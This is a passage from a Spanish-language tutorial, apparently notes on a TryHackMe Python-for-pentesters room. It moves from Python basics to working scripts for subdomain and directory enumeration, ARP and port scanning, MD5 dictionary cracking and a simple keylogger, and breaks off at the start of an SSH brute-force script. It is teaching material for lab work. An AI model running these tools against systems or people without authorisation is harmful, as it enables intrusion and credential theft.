<p>Así, este fragmento de código en primer lugar recoge una lista de nombres en una tupla ‘websites’ y seguidamente inicia la estructura del bucle for:</p>

<p>El término <em>for site in websites</em> inicia el for statement, seguidamente viene el término <em>site</em> que es el nombre de la variable que almacenará cada una de los valores de la lista en cada iteración tal y como indica el resto de la sentencia ‘in website’.</p>

<p>Seguidamente, viene el resto del statement que consiste en el código que se repite en cada iteración, el número de iteraciones obviamente coincide con el número de elementos que componen la lista.</p>

<p>Una forma más simple del código anterior sería:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">5</span><span class="p">):</span>
	<span class="k">print</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
</code></pre></div></div>

<p><br /></p>

<ul>
  <li><em>while</em>: Por otro lado, el bucle while mantiene las iteraciones hasta que cierta condición se deja de cumplir.</li>
</ul>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">i</span> <span class="o">=</span> <span class="mi">1</span>
<span class="k">while</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="mi">10</span><span class="p">:</span>
	<span class="k">print</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
	<span class="n">i</span> <span class="o">=</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span>
</code></pre></div></div>

<p>El mecanismo del código es claro, mientras i valga menos de 10, el código se repetirá en sucesivas iteraciones.</p>

<p><br /></p>

<p><strong>Introduction to Functions</strong></p>

<p>En la medida en la que un programa o script crece, también crece la complejidad del mismo y su consecuente tendencia a la no correcta legibilidad y la repetición.</p>

<p>Para paliar este efecto tenemos las <em>funciones</em>, que actuan como contenderos de código en el mismo sentido en el que las variables actúan como contenedores de datos aunque con algunas diferencias.</p>

<p>Por ejemplo, tenemos el siguiente código que define una función y la utiliza:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">sayHello</span><span class="p">(</span><span class="n">name</span><span class="p">):</span>
	<span class="k">print</span><span class="p">(</span><span class="s">"Hello "</span> <span class="o">+</span> <span class="n">name</span> <span class="o">+</span> <span class="s">"! Nice to meet you."</span><span class="p">)</span>

<span class="n">sayHello</span><span class="p">(</span><span class="s">"ben"</span><span class="p">)</span> <span class="c1"># Output is: Hello Ben! Nice to meet you
</span></code></pre></div></div>

<p>En primer lugar utiliza el término <em>def</em> para indicar la definición de una función al que sigue el nombre de la misma y los parámetros que necesita, en este caso uno: ‘name’. La cabecera de la función finaliza con dos puntos; ‘:’.</p>

<p>Seguidamente, todo el código que aparece debajo de forma identada es el código del que se compone la función, notemos que la variable name se utiliza dentro de la misma.</p>

<p>Asociado al concepto de función tenemos el concepto del alcance de una variable, la variable ‘name’ en la función anterior sólo tiene alcance dentro de la función, fuera de ella no está reconocida como una variable definida a ojos del intérprete tal y como vemos en la siguiente imagen:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020220904160426.png" text-align="center" />
</div>

<p>No ocurre así, al revés:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020220904160700.png" text-align="center" />
</div>

<p>Se dice que las variables definidas dentro de una función tienen un alcance “local” mientras que la variable definida en el exterior de la misma y de cualquier otra función tiene alcance “global”.</p>

<p><br /></p>

<p><strong>Files</strong></p>

<p>Una de las razones por las que Python es un lenguaje de programación tan importante es porque puede interactuar con el sistema operativo accediendo a ficheros o instruyendo ‘OS Commands’ tal y como Bash lo haría en Linux o Powershell en Windows con la diferencia de que ambos están limitados a dichos sistemas operativos.</p>

<p>De esta forma, Python es un lenguaje de programación que tiene la capacidad de operar tanto con Linux como con Windows y por “addirittura” casi siempre podemos encontrar un intérprete de Python en la máquina que estamos asaltando revelándose así como un lenguaje de programación imprescindible.</p>

<p>Veámos como podemos acceder a los ficheros con Python. Debemos saber antes que anda que para acceder a un fichero utilizamos la función interna (built-in function) <em>open</em> que tiene incorporados parámetros para interactuar de diferentes formas con los ficheros:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">varname</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">"file_name"</span><span class="p">,</span> <span class="s">"parameter"</span><span class="p">)</span>
</code></pre></div></div>

<p>El resultado de estas interacciones se guardan en variables que luego se manipulan dentro del código.</p>

<ul>
  <li><em>Lectura de ficheros</em>:</li>
</ul>

<p>Para leer un fichero empleamos el parámetro “r” de la función <em>“open”</em> anteriormente mencionada. Seguidamente, utilizamos un método sobre esta variable para acceder al contenido:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="p">.</span><span class="n">read</span><span class="p">())</span>
</code></pre></div></div>

<p><br /></p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020220904190320.png" text-align="center" />
</div>

<p>También podríamos utilizar el método “<em>readlines()</em>”.</p>

<p><br /></p>

<ul>
  <li><em>Escritura de ficheros</em>:</li>
</ul>

<p>En lo relativo a la escritura de ficheros encontramos dos tipos de acción, creación o sobreescritura de un fichero con el parámetro <em>“w”</em>:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">"demofile2.txt"</span><span class="p">,</span> <span class="s">"w"</span><span class="p">)</span> <span class="c1"># Creating and writing to a new file
</span><span class="n">f</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="s">"file content"</span><span class="p">)</span>
<span class="n">f</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
</code></pre></div></div>

<p>O añadir al contenido de un fichero existente otro contenido con el parámetro “<em>a</em>” (append)</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">"demofile1.txt"</span><span class="p">,</span> <span class="s">"a"</span><span class="p">)</span> <span class="c1"># Append to an existing file
</span><span class="n">f</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="s">"The file will include more text.."</span><span class="p">)</span>
<span class="n">f</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
</code></pre></div></div>

<p><br /></p>

<p><strong>Importación de librerias</strong></p>

<p>En el apartado anterior hemos utilizado una función interna de Python, existen muchas otras funciones internas, útiles en función del propósito que no se encuentran dentro del marco principal de Pythion, si no que hay que importalas desde librerias externas. que no son más que una colección de archivos que contienen funciones.</p>

<p>Por ejemplo;</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">datetime</span>
<span class="n">current_time</span> <span class="o">=</span> <span class="n">datetime</span><span class="p">.</span><span class="n">datetime</span><span class="p">.</span><span class="n">now</span><span class="p">()</span>
<span class="k">print</span><span class="p">(</span><span class="n">current_time</span><span class="p">)</span>
</code></pre></div></div>

<p>Hemos importado la libreria datetime con el término <em>import</em> y seguidamente nos hemos visto capacitados para utilizar la función interna “current_time”.</p>

<p>Algunas bibliotecas importantes como pentester son:</p>

<ul>
  <li>Request - simple HTTP library.</li>
  <li><a href="https://scapy.readthedocs.io/en/latest/introduction.html">Scapy</a> - send, sniff, dissect and forge network packets</li>
  <li><a href="https://docs.pwntools.com/en/stable/">Pwntools</a> - a CTF &amp; exploit development library.</li>
</ul>

<p>Muchas de estas bibliotecas ya están integradas en el lenguaje de programación; sin embargo, las bibliotecas escritas por otros programadores que aún no están instaladas en su máquina se pueden instalar usando una aplicación llamada pip, que es el administrador de paquetes de Python. Digamos que desea instalar la biblioteca “scapy” (que le permite crear sus propios paquetes en código y enviarlos a otras máquinas); lo instala primero ejecutando el comando <em>pip install scapy</em>, después de lo cual en su programa ahora puede importar la biblioteca scapy.</p>

<p><br /></p>

<h3 id="2-python-for-pentesters">2. Python for Pentesters.</h3>

<p><strong>Intro</strong></p>

<p>Anteriormente nos hemos adentrado en el uso básico de Python. Con este conocimiento supoerficial vamos a ver cómo podemos utilizar la herramienta Python como pentesters.</p>

<p>Un recurso importante es la herramienta <em>PyInstaller</em> instalable desde el gestor de paquetes de Python PIP:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pip <span class="nb">install </span>pyinstaller
</code></pre></div></div>

<p>Este que convierte scripts de python en ejecutables de Windows. Otra herramienta es <em>py2exe</em>.</p>

<p><br /></p>

<p><strong>Subdomain Enumeration</strong></p>

<p>Una de las capacidades de Python consiste en la automatización de tareas. Esto lo podemos aplicar en la búsqueda de subdominios de interés.</p>

<p>Como ya sabemos este es un proceso que que se focaliza en el descubrimiento de nuevos dispositivos o secciones dentro de la organización con el objetivo de ampliar la superficie de ataque y encontrar más puntos vulnerables.</p>

<p>El siguiente código de Python busca subdominios:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">sys</span>

<span class="n">sub_list</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">"subdomains.txt"</span><span class="p">).</span><span class="n">read</span><span class="p">()</span>
<span class="n">subdoms</span> <span class="o">=</span> <span class="n">sub_list</span><span class="p">.</span><span class="n">splitlines</span><span class="p">()</span>

<span class="k">for</span> <span class="n">sub</span> <span class="ow">in</span> <span class="n">subdoms</span><span class="p">:</span>
	<span class="n">sub_domains</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"http://</span><span class="si">{</span><span class="n">sub</span><span class="si">}</span><span class="s">.</span><span class="si">{</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="si">}</span><span class="s">"</span>

	<span class="k">try</span><span class="p">:</span>
	<span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">sub_domains</span><span class="p">)</span>

	<span class="k">except</span> <span class="n">requests</span><span class="p">.</span><span class="nb">ConnectionError</span><span class="p">:</span>
	<span class="k">pass</span>

	<span class="k">else</span><span class="p">:</span>
	<span class="k">print</span><span class="p">(</span><span class="s">"Valid domain: "</span><span class="p">,</span><span class="n">sub_domains</span><span class="p">)</span>
</code></pre></div></div>

<ul>
  <li>En primer lugar importa las librerias necesarias.</li>
</ul>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">sys</span>
</code></pre></div></div>
<ul>
  <li>Seguidamente, abre un fichero con candidatos a subdominios y divide el contenido por líneas.</li>
</ul>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">sub_list</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">"subdomains.txt"</span><span class="p">).</span><span class="n">read</span><span class="p">()</span>
<span class="n">subdoms</span> <span class="o">=</span> <span class="n">sub_list</span><span class="p">.</span><span class="n">splitlines</span><span class="p">()</span>
</code></pre></div></div>

<ul>
  <li>
    <p>Por último, implementa un bucle 2022-07-10-0.Scripting_for_pentesters.md con el que realiza para cada subdominio una request HTTP-GET y si esta tiene éxito se acepta como subdominio válido, de lo contrario se ignora y se pasa a la siguiente línea.</p>
  </li>
  <li>
    <p>Primero, forma la URL del subdominio:</p>
  </li>
</ul>

<pre><code class="language-default">sub_domains = f"http://{sub}.{sys.argv[1]}"
</code></pre>

<p>Juntando los términos: “http:// + subdominio de la iteración (sub) + el primer parámetro con el que se ha lanzado el script desde la línea de comandos (sys.argv[1])” que será en principio el dominio de la web que se está explorando.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 enumsubdomain.py tryhackme.com <span class="c">#&lt;-- sys.argv[1]</span>
</code></pre></div></div>

<ul>
  <li>Seguidamente intenta una conexión, HTTP-GET utilizando el string construido antes.</li>
</ul>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">try</span><span class="p">:</span>
<span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">sub_domains</span><span class="p">)</span>
</code></pre></div></div>

<ul>
  <li>Si no tiene éxito se crea una excepción en la que se pasa a la siguiente línea, de lo contrario se acepta como un dominio válido:</li>
</ul>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">except</span> <span class="n">requests</span><span class="p">.</span><span class="nb">ConnectionError</span><span class="p">:</span>
	<span class="k">pass</span>
<span class="k">else</span><span class="p">:</span>
	<span class="k">print</span><span class="p">(</span><span class="s">"Valid domain: "</span><span class="p">,</span><span class="n">sub_domains</span><span class="p">)</span>
</code></pre></div></div>

<p><br /></p>

<p><strong>Directory Enumeration</strong></p>

<p>El siguiente código escrito en python define una herramienta de enumeración de directorios simple:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">sys</span>

<span class="n">sub_list</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="n">encoding</span><span class="o">=</span><span class="s">'latin-1'</span><span class="p">).</span><span class="n">read</span><span class="p">()</span>
<span class="n">directories</span> <span class="o">=</span> <span class="n">sub_list</span><span class="p">.</span><span class="n">splitlines</span><span class="p">()</span>

<span class="k">for</span> <span class="nb">dir</span> <span class="ow">in</span> <span class="n">directories</span><span class="p">:</span>
	<span class="n">dir_enum</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"http://</span><span class="si">{</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="si">}</span><span class="s">/</span><span class="si">{</span><span class="nb">dir</span><span class="si">}</span><span class="s">.html"</span>
	<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">dir_enum</span><span class="p">)</span>
	<span class="k">if</span> <span class="n">r</span><span class="p">.</span><span class="n">status_code</span><span class="o">==</span><span class="mi">404</span><span class="p">:</span>
		<span class="k">pass</span>
	<span class="k">else</span><span class="p">:</span>
		<span class="k">print</span><span class="p">(</span><span class="s">"Valid directory:"</span> <span class="p">,</span><span class="n">dir_enum</span><span class="p">)</span>
</code></pre></div></div>

<ul>
  <li>En primer lugar, importa las librerías necesarias.</li>
</ul>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">sys</span>
</code></pre></div></div>

<ul>
  <li>Seguidamente, abre el documento que contiene candidatos a directorios y lo divide en líneas:</li>
</ul>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">sub_list</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">"wordlist.txt"</span><span class="p">).</span><span class="n">read</span><span class="p">()</span>
<span class="n">directories</span> <span class="o">=</span> <span class="n">sub_list</span><span class="p">.</span><span class="n">splitlines</span><span class="p">()</span>
</code></pre></div></div>

<ul>
  <li>
    <p>Por último, implementa un bucle for en el que emplea cada línea del documento anterior para realizar una request HTTP-GET sobre el directorio de la dirección ofrecida como parámetro a la hora de invocar el script con el intérprete de python. Se recoge la respuesta y si devuelve un código que no sea el 404 se acepta como válido de lo contrario se rechaza y se pasa al siguiente.</p>
  </li>
  <li>
    <p>Se construye la URL con el directorio en cuestión:</p>
  </li>
</ul>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">dir_enum</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"http://</span><span class="si">{</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="si">}</span><span class="s">/</span><span class="si">{</span><span class="nb">dir</span><span class="si">}</span><span class="s">.html"</span>
</code></pre></div></div>

<p>Esta URL se crea juntando los términos “http://” +”direcciónwebpasadacomoparámetro(sys.argv[1])”+”directorio(dir).html”</p>

<ul>
  <li>Se realiza la request y se evalúa con un if:</li>
</ul>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">dir_enum</span><span class="p">)</span>
	<span class="k">if</span> <span class="n">r</span><span class="p">.</span><span class="n">status_code</span><span class="o">==</span><span class="mi">404</span><span class="p">:</span>
		<span class="k">pass</span>
	<span class="k">else</span><span class="p">:</span>
		<span class="k">print</span><span class="p">(</span><span class="s">"Valid directory:"</span> <span class="p">,</span><span class="n">dir_enum</span><span class="p">)</span>
</code></pre></div></div>

<p>Al igual que el del apartado anterior, este script se debe lanzar con un parámetro que es de hecho la propia dirección del servidor que se desea explorar:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020220907164839.png" text-align="center" />
</div>

<p><br /></p>

<p><strong>Network Scanner</strong></p>

<p>También podemos utilizar Python para montar un scaner ICMP simple para identificar grandes redes de dispositivos. Por otra parte es una herramienta muy simple debido a que los paquetes ICMP envíados por el código pueden ser fácilmente monitoreados o directamente bloqueados.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">scapy.all</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">interface</span> <span class="o">=</span> <span class="s">"eth0"</span>
<span class="n">ip_range</span> <span class="o">=</span> <span class="s">"10.10.X.X/24"</span>
<span class="n">broadcastMac</span> <span class="o">=</span> <span class="s">"ff:ff:ff:ff:ff:ff"</span>

<span class="n">packet</span> <span class="o">=</span> <span class="n">Ether</span><span class="p">(</span><span class="n">dst</span><span class="o">=</span><span class="n">broadcastMac</span><span class="p">)</span><span class="o">/</span><span class="n">ARP</span><span class="p">(</span><span class="n">pdst</span> <span class="o">=</span> <span class="n">ip_range</span><span class="p">)</span>

<span class="n">ans</span><span class="p">,</span> <span class="n">unans</span> <span class="o">=</span> <span class="n">srp</span><span class="p">(</span><span class="n">packet</span><span class="p">,</span> <span class="n">timeout</span> <span class="o">=</span><span class="mi">2</span><span class="p">,</span> <span class="n">iface</span><span class="o">=</span><span class="n">interface</span><span class="p">,</span> <span class="n">inter</span><span class="o">=</span><span class="mf">0.1</span><span class="p">)</span>

<span class="k">for</span> <span class="n">send</span><span class="p">,</span><span class="n">receive</span> <span class="ow">in</span> <span class="n">ans</span><span class="p">:</span>
	<span class="k">print</span> <span class="p">(</span><span class="n">receive</span><span class="p">.</span><span class="n">sprintf</span><span class="p">(</span><span class="sa">r</span><span class="s">"%Ether.src% - %ARP.psrc%"</span><span class="p">))</span>
</code></pre></div></div>

<p>Los resultados serían similares a:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020220907182936.png" text-align="center" />
</div>

<p>Antes de utilizar el script sería necesario instalarse scapy antes:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>apt <span class="nb">install </span>python3-scapy
</code></pre></div></div>

<p><br /></p>

<p><strong>Port Scanner</strong></p>

<p>También podemos construir un Scanner de puertos básicos:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">import</span> <span class="nn">socket</span>
<span class="kn">import</span> <span class="nn">pyfiglet</span>


<span class="n">ascii_banner</span> <span class="o">=</span> <span class="n">pyfiglet</span><span class="p">.</span><span class="n">figlet_format</span><span class="p">(</span><span class="s">"TryHackMe </span><span class="se">\n</span><span class="s"> Python 4 Pentesters </span><span class="se">\n</span><span class="s">Port Scanner"</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">ascii_banner</span><span class="p">)</span>


<span class="n">ip</span> <span class="o">=</span> <span class="s">'192.168.1.6'</span>
<span class="n">open_ports</span> <span class="o">=</span><span class="p">[]</span>

<span class="n">ports</span> <span class="o">=</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">65535</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">probe_port</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="n">result</span> <span class="o">=</span> <span class="mi">1</span><span class="p">):</span>
	<span class="k">try</span><span class="p">:</span>
		<span class="n">sock</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
		<span class="n">sock</span><span class="p">.</span><span class="n">settimeout</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>
		<span class="n">r</span> <span class="o">=</span> <span class="n">sock</span><span class="p">.</span><span class="n">connect_ex</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
		<span class="k">if</span> <span class="n">r</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
			<span class="n">result</span> <span class="o">=</span> <span class="n">r</span>
		<span class="n">sock</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
	<span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
		<span class="k">pass</span>
	<span class="k">return</span> <span class="n">result</span>


<span class="k">for</span> <span class="n">port</span> <span class="ow">in</span> <span class="n">ports</span><span class="p">:</span>
	<span class="n">sys</span><span class="p">.</span><span class="n">stdout</span><span class="p">.</span><span class="n">flush</span><span class="p">()</span>
	<span class="n">response</span> <span class="o">=</span> <span class="n">probe_port</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
	<span class="k">if</span> <span class="n">response</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
		<span class="n">open_ports</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">port</span><span class="p">)</span>


<span class="k">if</span> <span class="n">open_ports</span><span class="p">:</span>
	<span class="k">print</span> <span class="p">(</span><span class="s">"Open Ports are: "</span><span class="p">)</span>
	<span class="k">print</span> <span class="p">(</span><span class="nb">sorted</span><span class="p">(</span><span class="n">open_ports</span><span class="p">))</span>
<span class="k">else</span><span class="p">:</span>
	<span class="k">print</span> <span class="p">(</span><span class="s">"Looks like no ports are open :("</span><span class="p">)</span>
</code></pre></div></div>

<p>Es posible que necesitemos tener instalado el paquete pyfiglet:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>apt <span class="nb">install </span>python3-pyfiglet
</code></pre></div></div>

<p><br /></p>

<p><strong>File Downloader</strong></p>

<p>Herramientas de Linux como Wget o Certutil en Windows son útiles para descargar ficheros.</p>

<p>Python puede ser utilizado con el mismo propósito con, por ejemplo, el siguiente código:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">requests</span>

<span class="n">url</span> <span class="o">=</span> <span class="s">'https://assets.tryhackme.com/img/THMlogo.png'</span>
<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">allow_redirects</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
<span class="nb">open</span><span class="p">(</span><span class="s">'THMlogo.png'</span><span class="p">,</span> <span class="s">'wb'</span><span class="p">).</span><span class="n">write</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">content</span><span class="p">)</span>
</code></pre></div></div>

<ul>
  <li>Primero se cargan las librerias necesarias.</li>
  <li>Se guarda en la variable URL la propia URL hacia el fichero que queremos descargar.</li>
  <li>Seguidamente, se guarda en una variable una request HTTP-GET a la URL antes construida.</li>
  <li>Por último, se escribe el contenida de la respuesta almacenada en la variable anterior en un nuevo fichero que, por comodidad, tiene el mismo nombre que el fichero que queremos descargar.</li>
</ul>

<p>Este código se puede modificar para descargar otra clase de ficheros:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">url</span> <span class="o">=</span> <span class="s">'https://download.sysinternals.com/files/PSTools.zip'</span>
<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">allow_redirects</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
<span class="nb">open</span><span class="p">(</span><span class="s">'PSTools.zip'</span><span class="p">,</span> <span class="s">'wb'</span><span class="p">).</span><span class="n">write</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">content</span><span class="p">)</span>
</code></pre></div></div>

<p><br /></p>

<p><strong>Hashcraker</strong></p>

<p>Como sabemos, un Hash es el producto de pasar un dato (como una contraseña) por una función de hash que en términos simples, transforma el dato de forma que el producto es único para el dato y no puede de ningún modo conducir a la recuperación de la información.</p>

<p>Los hashes sólo son reversibles por un ataque de diccionario, que consiste en, sabiendo el método de transformación de la información, transformar vía el mismo método una lista de términos esperando obtener una coincidencia con el hash original.</p>

<p>Podemos escribir en Python un script para automatizar un ataque de lista de diccionario:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">hashlib</span>
<span class="kn">import</span> <span class="nn">pyfiglet</span>

<span class="n">ascii_banner</span> <span class="o">=</span> <span class="n">pyfiglet</span><span class="p">.</span><span class="n">figlet_format</span><span class="p">(</span><span class="s">"TryHackMe </span><span class="se">\n</span><span class="s"> Python 4 Pentesters </span><span class="se">\n</span><span class="s"> HASH CRACKER for MD 5"</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">ascii_banner</span><span class="p">)</span>

<span class="n">wordlist_location</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="nb">input</span><span class="p">(</span><span class="s">'Enter wordlist file location: '</span><span class="p">))</span>
<span class="n">hash_input</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="nb">input</span><span class="p">(</span><span class="s">'Enter hash to be cracked: '</span><span class="p">))</span>

<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">wordlist_location</span><span class="p">,</span> <span class="s">'r'</span><span class="p">,</span> <span class="n">encoding</span><span class="o">=</span><span class="s">'latin-1'</span><span class="p">)</span> <span class="k">as</span> <span class="nb">file</span><span class="p">:</span>
	<span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="nb">file</span><span class="p">.</span><span class="n">readlines</span><span class="p">():</span>
		<span class="n">hash_ob</span> <span class="o">=</span> <span class="n">hashlib</span><span class="p">.</span><span class="n">md5</span><span class="p">(</span><span class="n">line</span><span class="p">.</span><span class="n">strip</span><span class="p">().</span><span class="n">encode</span><span class="p">())</span>
		<span class="n">hashed_pass</span> <span class="o">=</span> <span class="n">hash_ob</span><span class="p">.</span><span class="n">hexdigest</span><span class="p">()</span>
		<span class="k">if</span> <span class="n">hashed_pass</span> <span class="o">==</span> <span class="n">hash_input</span><span class="p">:</span>
			<span class="k">print</span><span class="p">(</span><span class="s">'Found cleartext password! '</span> <span class="o">+</span> <span class="n">line</span><span class="p">.</span><span class="n">strip</span><span class="p">())</span>
			<span class="nb">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</code></pre></div></div>

<p>Podemos observar, saltándonos una descripción minuciosa del script, que lo que hace es pedir al usuario una lista de posibles candidatos, el hash a crackear e implementa un bucle en el que lee línea a línea cada uno de los candidatos y los transforma de acuerdo al formato escogido</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">hash_ob</span> <span class="o">=</span> <span class="n">hashlib</span><span class="p">.</span><span class="n">md5</span><span class="p">(</span><span class="n">line</span><span class="p">.</span><span class="n">strip</span><span class="p">().</span><span class="n">encode</span><span class="p">())</span>
</code></pre></div></div>

<p>que en este caso es md5 (MD5 hash value) pero que puede ser uno de los muchos que python soporta gracias a la librería hashlib</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020220907210816.png" text-align="center" />
</div>

<p>y luego compara ambas cadenas de caracteres. Así, si hay un match, muestra el candidato por pantalla.</p>

<p><br /></p>

<p><strong>Keylogger</strong></p>

<p>Un keylogger es un tipo de malware que registra todas las teclas del ordenador que el usuario pulsa. Eficaz para recopilar información sensible, como contraseñas, correos, etc.</p>

<p>Podemos construir un script con Python para fabricar un keylogger gracias al modulo ‘keyboard’ instalable desde pip3:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pip3 <span class="nb">install </span>keyboard
</code></pre></div></div>

<p>El código es:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">keyboard</span>
<span class="n">keys</span> <span class="o">=</span> <span class="n">keyboard</span><span class="p">.</span><span class="n">record</span><span class="p">(</span><span class="n">until</span> <span class="o">=</span><span class="s">'ENTER'</span><span class="p">)</span>
<span class="n">keyboard</span><span class="p">.</span><span class="n">play</span><span class="p">(</span><span class="n">keys</span><span class="p">)</span>
</code></pre></div></div>

<p><br /></p>

<p><strong>SSH Bruteforcing</strong></p>

<p>Podemos llevar a cabo un ataque de fuerza bruta para autenticarnos en un servicio. En este caso por ejemplo en SSH:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">paramiko</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">import</span> <span class="nn">os</span>

